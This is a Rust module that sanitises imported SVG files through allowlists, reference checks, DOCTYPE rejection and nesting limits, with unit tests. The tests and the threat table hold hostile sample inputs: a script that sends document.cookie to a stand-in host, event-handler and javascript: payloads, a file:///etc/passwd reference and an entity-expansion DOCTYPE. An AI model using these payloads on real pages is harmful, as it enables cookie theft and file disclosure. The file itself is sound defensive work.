//! Making an imported SVG safe to embed.
//!
//! An SVG is a program, not a picture. Importing one means accepting a file
//! from wherever the user or an agent found it and putting its contents
//! inside documents this engine renders — so it is untrusted input and is
//! treated as such (PRD §10.1, FR-5).
//!
//! # What can go wrong, and what is done about it
//!
//! | Threat | What it looks like | Answer |
//! | ------ | ------------------ | ------ |
//! | Script execution | `<script>`, `onload=`, `javascript:` in an href | Elements and attributes removed |
//! | Data exfiltration on render | `<image href="https://…">`, `<use href="http…">`, `@import` in a style | External references removed |
//! | Local file disclosure | `xlink:href="file:///etc/passwd"`, `<image href="../../secrets.png">` | Only `data:` and same-document `#fragment` references survive |
//! | XML entity expansion (billion laughs, XXE) | `<!DOCTYPE … <!ENTITY …>` | Any DOCTYPE is rejected outright |
//! | Embedded foreign content | `<foreignObject>` with HTML, iframes | Elements removed |
//! | Renderer denial of service | Enormous nesting or path data | Size and depth limits |
//!
//! # What is deliberately not done
//!
//! This does not try to be a general-purpose SVG sanitiser for the open web.
//! It is an allowlist: elements and attributes not on it are dropped, so a
//! feature nobody thought about is removed rather than passed through. The
//! cost is that an exotic-but-legitimate SVG may lose parts of itself, and it
//! is the right trade — a picture that renders slightly wrong is recoverable,
//! a document that phones home is not.

use std::collections::BTreeSet;

/// Elements an imported SVG may contain.
///
/// Drawing and structure only: no scripting, no external content, no
/// interactivity.
const ALLOWED_ELEMENTS: &[&str] = &[
    "svg",
    "g",
    "defs",
    "title",
    "desc",
    "path",
    "rect",
    "circle",
    "ellipse",
    "line",
    "polyline",
    "polygon",
    "text",
    "tspan",
    "use",
    "symbol",
    "marker",
    "clipPath",
    "mask",
    "pattern",
    "linearGradient",
    "radialGradient",
    "stop",
    "image",
];

/// Attributes an imported SVG may carry.
///
/// Presentation attributes and geometry. Every `on*` handler is absent by
/// construction, because this is an allowlist.
const ALLOWED_ATTRIBUTES: &[&str] = &[
    "id",
    "class",
    "d",
    "x",
    "y",
    "x1",
    "y1",
    "x2",
    "y2",
    "cx",
    "cy",
    "r",
    "rx",
    "ry",
    "width",
    "height",
    "points",
    "viewBox",
    "preserveAspectRatio",
    "transform",
    "gradientTransform",
    "gradientUnits",
    "patternUnits",
    "patternContentUnits",
    "clipPathUnits",
    "maskUnits",
    "markerWidth",
    "markerHeight",
    "refX",
    "refY",
    "orient",
    "offset",
    "fill",
    "fill-opacity",
    "fill-rule",
    "stroke",
    "stroke-width",
    "stroke-opacity",
    "stroke-linecap",
    "stroke-linejoin",
    "stroke-dasharray",
    "stroke-dashoffset",
    "stroke-miterlimit",
    "opacity",
    "color",
    "stop-color",
    "stop-opacity",
    "font-family",
    "font-size",
    "font-weight",
    "font-style",
    "text-anchor",
    "letter-spacing",
    "word-spacing",
    "dominant-baseline",
    "clip-path",
    "clip-rule",
    "mask",
    "display",
    "visibility",
    "xmlns",
    "version",
    // Accessibility. An author who labelled their own graphic said something
    // about it that nothing else in the file records, and dropping it made an
    // import quietly lossy. None of these names anything to fetch: `role` is a
    // token and the other three are either literal text or ids inside the same
    // document, so they cost the threat model nothing.
    "role",
    "aria-label",
    "aria-labelledby",
    "aria-describedby",
];

/// Attributes that name something to fetch, and so need their value checked
/// rather than just their name.
const REFERENCE_ATTRIBUTES: &[&str] = &["href", "xlink:href"];

/// Largest SVG this will accept, in bytes.
///
/// An imported vector asset that is bigger than this is almost certainly a
/// traced photograph, which belongs in as a raster image.
pub const MAX_SVG_BYTES: usize = 4 * 1024 * 1024;

/// Deepest element nesting accepted.
const MAX_DEPTH: usize = 64;

/// Why an SVG could not be imported.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[non_exhaustive]
pub enum SvgImportError {
    /// The file is larger than [`MAX_SVG_BYTES`].
    #[error("the SVG is {size} bytes, larger than the {MAX_SVG_BYTES} byte limit")]
    TooLarge {
        /// Size of the offending file.
        size: usize,
    },

    /// The file declares a DOCTYPE.
    ///
    /// Rejected rather than stripped: a DOCTYPE in an imported asset has no
    /// legitimate use here, and entity expansion attacks live there.
    #[error("the SVG declares a DOCTYPE, which is not accepted")]
    DoctypeDeclared,

    /// The file is not XML this can read.
    #[error("the SVG could not be parsed: {0}")]
    Malformed(String),

    /// The file has no `<svg>` root.
    #[error("the file has no <svg> root element")]
    NotSvg,

    /// Nesting deeper than [`MAX_DEPTH`].
    #[error("the SVG nests more than {MAX_DEPTH} levels deep")]
    TooDeep,
}

/// What a sanitised import removed, so the caller can tell the user.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SvgImportReport {
    /// Names of elements that were removed, sorted and deduplicated.
    pub removed_elements: BTreeSet<String>,
    /// Names of attributes that were removed, sorted and deduplicated.
    pub removed_attributes: BTreeSet<String>,
    /// External references that were removed, sorted and deduplicated.
    pub removed_references: BTreeSet<String>,
}

impl SvgImportReport {
    /// Whether anything was taken out.
    pub fn is_clean(&self) -> bool {
        self.removed_elements.is_empty()
            && self.removed_attributes.is_empty()
            && self.removed_references.is_empty()
    }
}

/// Whether an element may be kept.
pub fn is_allowed_element(name: &str) -> bool {
    ALLOWED_ELEMENTS.contains(&local_name(name))
}

/// Whether an attribute may be kept, ignoring its value.
pub fn is_allowed_attribute(name: &str) -> bool {
    // Event handlers are excluded by the allowlist already; checking for them
    // explicitly, and case-insensitively, makes the intent obvious to anyone
    // extending the list later.
    if name.to_ascii_lowercase().starts_with("on") {
        return false;
    }
    // Matched case-sensitively: SVG attribute names are, and `viewBox` is not
    // `viewbox`.
    ALLOWED_ATTRIBUTES.contains(&name)
        || ALLOWED_ATTRIBUTES.contains(&local_name(name))
        || REFERENCE_ATTRIBUTES.contains(&name)
}

/// Whether a reference value may be kept.
///
/// Only two kinds survive: a fragment pointing inside the same document, and
/// a `data:` URI carrying its own bytes. Everything else — `http:`, `file:`,
/// a relative path, `javascript:` — would make rendering depend on something
/// outside the document, which breaks both the offline promise (NFR-5) and
/// the filesystem boundary (PRD §10.1).
pub fn is_allowed_reference(value: &str) -> bool {
    let value = value.trim();
    if value.starts_with('#') {
        return true;
    }
    let lowered = value.to_ascii_lowercase();
    lowered.starts_with("data:image/png;base64,")
        || lowered.starts_with("data:image/jpeg;base64,")
        || lowered.starts_with("data:image/gif;base64,")
        || lowered.starts_with("data:image/webp;base64,")
}

fn local_name(name: &str) -> &str {
    match name.split_once(':') {
        Some((_, local)) => local,
        None => name,
    }
}

/// Checks the parts of an import that do not need a parser.
///
/// Separate from parsing so the cheap rejections happen before any work is
/// done on a hostile file.
pub fn check_before_parsing(source: &str) -> Result<(), SvgImportError> {
    if source.len() > MAX_SVG_BYTES {
        return Err(SvgImportError::TooLarge { size: source.len() });
    }
    if source.contains("<!DOCTYPE") || source.contains("<!doctype") {
        return Err(SvgImportError::DoctypeDeclared);
    }
    // Depth is checked here, by scanning the text, rather than while walking
    // the parsed tree — because the parser is what dies first. A few hundred
    // bytes of nested `<g>` elements overflows the stack inside
    // `roxmltree::Document::parse`, and a stack overflow aborts the process:
    // no error type can report it and no caller can recover from it. The only
    // defence is never to hand the parser a file that deep.
    if max_nesting_depth(source) > MAX_DEPTH {
        return Err(SvgImportError::TooDeep);
    }
    Ok(())
}

/// Upper bound on how deeply the markup nests, from a scan of the text.
///
/// Deliberately approximate: it does not validate the XML, it only refuses to
/// be surprised by it. Quoted attribute values are tracked so that a `>`
/// inside one does not end a tag early.
fn max_nesting_depth(source: &str) -> usize {
    let bytes = source.as_bytes();
    let mut depth: usize = 0;
    let mut deepest = 0;
    let mut index = 0;

    while index < bytes.len() {
        if bytes[index] != b'<' {
            index += 1;
            continue;
        }

        match bytes.get(index + 1) {
            // A closing tag.
            Some(b'/') => {
                depth = depth.saturating_sub(1);
                index = end_of_tag(bytes, index);
            }
            // A comment, CDATA, or processing instruction: no nesting.
            Some(b'!' | b'?') => index = end_of_tag(bytes, index),
            _ => {
                let end = end_of_tag(bytes, index);
                // `<tag/>` opens and closes at once.
                let self_closing = end > 0 && bytes.get(end - 1) == Some(&b'/');
                if !self_closing {
                    depth += 1;
                    deepest = deepest.max(depth);
                }
                index = end;
            }
        }
        index += 1;
    }

    deepest
}

/// Index of the `>` that ends the tag starting at `start`, or the end of the
/// input.
fn end_of_tag(bytes: &[u8], start: usize) -> usize {
    let mut quote: Option<u8> = None;
    let mut index = start + 1;
    while index < bytes.len() {
        let byte = bytes[index];
        match quote {
            Some(open) if byte == open => quote = None,
            Some(_) => {}
            None if byte == b'"' || byte == b'\'' => quote = Some(byte),
            None if byte == b'>' => return index,
            None => {}
        }
        index += 1;
    }
    bytes.len()
}

/// Rewrites an SVG as the subset of itself that is safe to embed.
///
/// Returns the cleaned markup and a report of what was taken out. The result
/// is what gets stored in the project: everything under `assets/` is already
/// safe, so nothing downstream has to remember to sanitise again.
pub fn sanitize(source: &str) -> Result<(String, SvgImportReport), SvgImportError> {
    check_before_parsing(source)?;

    let document = roxmltree::Document::parse(source)
        .map_err(|error| SvgImportError::Malformed(error.to_string()))?;
    let root = document.root_element();
    if local_name(root.tag_name().name()) != "svg" {
        return Err(SvgImportError::NotSvg);
    }

    let mut report = SvgImportReport::default();
    let mut out = String::with_capacity(source.len());
    write_element(root, &mut out, &mut report, 0)?;
    out.push('\n');
    Ok((out, report))
}

fn write_element(
    node: roxmltree::Node<'_, '_>,
    out: &mut String,
    report: &mut SvgImportReport,
    depth: usize,
) -> Result<(), SvgImportError> {
    use std::fmt::Write as _;

    if depth > MAX_DEPTH {
        return Err(SvgImportError::TooDeep);
    }

    let name = node.tag_name().name();
    let _ = write!(out, "<{name}");

    if depth == 0 {
        // The root always carries the namespace, even if the source left it
        // to a default declaration this walk does not reproduce.
        out.push_str(" xmlns=\"http://www.w3.org/2000/svg\"");
    }

    for attribute in node.attributes() {
        let attribute_name = qualified_name(attribute);
        if attribute_name == "xmlns" {
            continue;
        }
        if !is_allowed_attribute(&attribute_name) {
            report.removed_attributes.insert(attribute_name);
            continue;
        }
        if REFERENCE_ATTRIBUTES.contains(&local_name(&attribute_name))
            && !is_allowed_reference(attribute.value())
        {
            report
                .removed_references
                .insert(attribute.value().trim().to_owned());
            continue;
        }
        let _ = write!(
            out,
            " {}=\"{}\"",
            attribute_name,
            escape_attribute(attribute.value())
        );
    }

    let children: Vec<_> = node
        .children()
        .filter(|child| child.is_element() || child.is_text())
        .collect();
    if children.is_empty() {
        out.push_str("/>");
        return Ok(());
    }

    out.push('>');
    for child in children {
        if child.is_text() {
            out.push_str(&escape_text(child.text().unwrap_or_default()));
            continue;
        }
        let child_name = child.tag_name().name();
        if !is_allowed_element(child_name) {
            // The element and everything inside it goes: a dropped
            // `<foreignObject>` whose children were kept would be worse than
            // useless.
            report.removed_elements.insert(child_name.to_owned());
            continue;
        }
        write_element(child, out, report, depth + 1)?;
    }
    let _ = write!(out, "</{name}>");
    Ok(())
}

fn qualified_name(attribute: roxmltree::Attribute<'_, '_>) -> String {
    match attribute.namespace() {
        // Only the xlink namespace is worth preserving by prefix; anything
        // else that survived the allowlist is unprefixed.
        Some(namespace) if namespace.contains("xlink") => {
            format!("xlink:{}", attribute.name())
        }
        _ => attribute.name().to_owned(),
    }
}

fn escape_attribute(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

fn escape_text(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used)]

    use super::*;

    #[test]
    fn scripting_is_not_allowed() {
        assert!(!is_allowed_element("script"));
        assert!(!is_allowed_element("foreignObject"));
        assert!(!is_allowed_element("iframe"));
        assert!(!is_allowed_element("animate"));
        assert!(!is_allowed_attribute("onload"));
        assert!(!is_allowed_attribute("onclick"));
        assert!(!is_allowed_attribute("onmouseover"));
        assert!(!is_allowed_attribute("style"));
    }

    #[test]
    fn drawing_elements_are_allowed() {
        for element in ["svg", "path", "g", "rect", "linearGradient", "text"] {
            assert!(is_allowed_element(element), "{element}");
        }
        assert!(is_allowed_element("svg:path"), "namespaced names");
    }

    #[test]
    fn only_fragments_and_data_images_are_allowed_references() {
        assert!(is_allowed_reference("#gradient1"));
        assert!(is_allowed_reference("data:image/png;base64,AAAA"));

        assert!(!is_allowed_reference("https://example.com/pixel.png"));
        assert!(!is_allowed_reference("http://example.com/pixel.png"));
        assert!(!is_allowed_reference("file:///etc/passwd"));
        assert!(!is_allowed_reference("../../secrets.png"));
        assert!(!is_allowed_reference("javascript:alert(1)"));
        assert!(!is_allowed_reference("  JavaScript:alert(1)"));
        assert!(!is_allowed_reference("data:text/html;base64,AAAA"));
    }

    #[test]
    fn scripts_and_handlers_do_not_survive_import() {
        let hostile = r##"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" onload="steal()">
            <script>fetch('https://example.com/' + document.cookie)</script>
            <rect width="10" height="10" fill="#ff0000" onclick="alert(1)"/>
            <foreignObject><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject>
        </svg>"##;

        let (clean, report) =
            sanitize(hostile).expect("it should import, minus the dangerous parts");

        assert!(!clean.contains("script"), "{clean}");
        assert!(!clean.contains("onload"), "{clean}");
        assert!(!clean.contains("onclick"), "{clean}");
        assert!(!clean.contains("foreignObject"), "{clean}");
        // The drawing survives.
        assert!(clean.contains("<rect"), "{clean}");
        assert!(clean.contains("#ff0000"), "{clean}");

        assert!(report.removed_elements.contains("script"));
        assert!(report.removed_elements.contains("foreignObject"));
        assert!(report.removed_attributes.contains("onload"));
        assert!(!report.is_clean());
    }

    #[test]
    fn accessibility_metadata_survives_import() {
        let labelled = r##"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" role="img" aria-label="Logo">
            <title id="t">Logo</title>
            <rect width="10" height="10" fill="#ff0000" aria-labelledby="t" aria-describedby="t"/>
        </svg>"##;

        let (clean, report) = sanitize(labelled).unwrap();

        assert!(clean.contains(r#"role="img""#), "{clean}");
        assert!(clean.contains(r#"aria-label="Logo""#), "{clean}");
        assert!(clean.contains(r#"aria-labelledby="t""#), "{clean}");
        assert!(clean.contains(r#"aria-describedby="t""#), "{clean}");
        assert!(
            report.is_clean(),
            "a labelled graphic loses nothing: {report:?}"
        );
    }

    #[test]
    fn external_references_do_not_survive_import() {
        let leaky = r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">
            <image href="https://example.com/tracker.png" width="10" height="10"/>
            <image xlink:href="file:///etc/passwd" width="10" height="10"/>
            <use href="#legit"/>
            <image href="data:image/png;base64,AAAA" width="1" height="1"/>
        </svg>"##;

        let (clean, report) = sanitize(leaky).unwrap();

        assert!(!clean.contains("example.com"), "{clean}");
        assert!(!clean.contains("/etc/passwd"), "{clean}");
        // Same-document and self-contained references are kept.
        assert!(clean.contains("#legit"), "{clean}");
        assert!(clean.contains("data:image/png;base64,AAAA"), "{clean}");
        assert_eq!(report.removed_references.len(), 2);
    }

    #[test]
    fn a_clean_svg_is_reported_clean_and_still_renders_the_same_shapes() {
        let source = r##"<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"><g transform="translate(1 1)"><circle cx="5" cy="5" r="4" fill="#00ff00" stroke="#000000" stroke-width="0.5"/></g></svg>"##;
        let (clean, report) = sanitize(source).unwrap();
        assert!(report.is_clean(), "{report:?}");
        for fragment in [
            "<circle",
            "cx=\"5\"",
            "#00ff00",
            "translate(1 1)",
            "viewBox",
        ] {
            assert!(clean.contains(fragment), "{fragment} missing from {clean}");
        }
    }

    #[test]
    fn sanitising_twice_changes_nothing_the_second_time() {
        let source = r#"<svg xmlns="http://www.w3.org/2000/svg" width="5" height="5"><rect width="5" height="5" onclick="x()"/></svg>"#;
        let (once, _) = sanitize(source).unwrap();
        let (twice, report) = sanitize(&once).unwrap();
        assert_eq!(once, twice);
        assert!(report.is_clean());
    }

    #[test]
    fn text_content_is_escaped_not_reinterpreted() {
        let source = r#"<svg xmlns="http://www.w3.org/2000/svg" width="5" height="5"><text>a &lt; b &amp; c</text></svg>"#;
        let (clean, _) = sanitize(source).unwrap();
        assert!(clean.contains("a &lt; b &amp; c"), "{clean}");
    }

    #[test]
    fn a_file_that_is_not_an_svg_is_refused() {
        assert_eq!(
            sanitize("<html><body>no</body></html>"),
            Err(SvgImportError::NotSvg)
        );
        assert!(matches!(
            sanitize("<svg><unclosed>"),
            Err(SvgImportError::Malformed(_))
        ));
    }

    #[test]
    fn nesting_depth_is_measured_without_parsing() {
        assert_eq!(max_nesting_depth("<svg><g><rect/></g></svg>"), 2);
        assert_eq!(max_nesting_depth("<svg/>"), 0);
        assert_eq!(max_nesting_depth("<a><b/></a><c><d><e/></d></c>"), 2);
        // A `>` inside an attribute value must not end the tag early.
        assert_eq!(max_nesting_depth(r#"<svg title="a > b"><g/></svg>"#), 1);
        // Comments and declarations do not nest.
        assert_eq!(
            max_nesting_depth("<?xml version=\"1.0\"?><!-- <g> --><svg/>"),
            0
        );
    }

    #[test]
    fn deep_nesting_is_refused_before_the_parser_sees_it() {
        // The parser overflows the stack on input this deep, and a stack
        // overflow aborts the process — so this check has to happen first.
        let deep = format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\">{}{}</svg>",
            "<g>".repeat(200),
            "</g>".repeat(200)
        );
        assert_eq!(check_before_parsing(&deep), Err(SvgImportError::TooDeep));
        assert_eq!(sanitize(&deep), Err(SvgImportError::TooDeep));

        // Ordinary nesting is unaffected.
        let shallow = format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\">{}{}</svg>",
            "<g>".repeat(10),
            "</g>".repeat(10)
        );
        assert!(sanitize(&shallow).is_ok());
    }

    #[test]
    fn oversized_and_doctype_files_are_rejected_before_parsing() {
        let big = "x".repeat(MAX_SVG_BYTES + 1);
        assert_eq!(
            check_before_parsing(&big),
            Err(SvgImportError::TooLarge { size: big.len() })
        );

        let entity = r#"<!DOCTYPE svg [<!ENTITY lol "lol">]><svg/>"#;
        assert_eq!(
            check_before_parsing(entity),
            Err(SvgImportError::DoctypeDeclared)
        );

        assert_eq!(check_before_parsing("<svg></svg>"), Ok(()));
    }
}
